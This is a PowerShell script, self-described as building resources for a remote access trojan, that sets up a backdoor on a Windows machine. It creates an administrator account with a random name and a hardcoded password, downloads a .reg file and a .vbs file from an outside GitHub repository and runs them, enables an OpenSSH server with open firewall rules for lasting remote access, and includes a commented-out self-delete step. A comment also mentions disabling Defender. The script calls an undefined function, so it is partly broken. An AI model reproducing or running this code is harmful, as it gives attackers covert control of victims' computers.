#biulds resources for the  rat
# created by Dark Lord


#random string for direcories
 function random_text {
     return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
 }
#attemp to disable the defender



# 1. Define variables FIRST
$uname = random_text
$password = (ConvertTo-SecureString "Rat@@123"-AsPlainText -Force)
$wd = random_text
$path = "$env:temp/$wd"  # Define BEFORE using it!
$initial_dir = Get-Location

# 2. Create admin user
create_account -uname $uname -password $password

# 3. Create working directory
mkdir $path 
cd $path 

# 4. Download files to current directory
$reg_file = random_text
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/knightcoder77/DarkSauron/main/files/admin.reg" -OutFile "$reg_file.reg"

$vbs_file = random_text
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/knightcoder77/DarkSauron/main/files/confirm.vbs" -OutFile "$vbs_file.vbs"

# 5. Execute files properly
Start-Process "reg.exe" -ArgumentList "import `"$reg_file.reg`""
Start-Process "wscript.exe" -ArgumentList "`"$vbs_file.vbs`""

# 6. Enable SSH (fix firewall command)
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 
Start-Service sshd 
Set-Service -Name sshd -StartupType 'Automatic' 
Get-NetFirewallRule -Name *ssh* | Set-NetFirewallRule -Enabled True

# 7. Optional: Self delete
# cd $initial_dir
# del installer.ps1

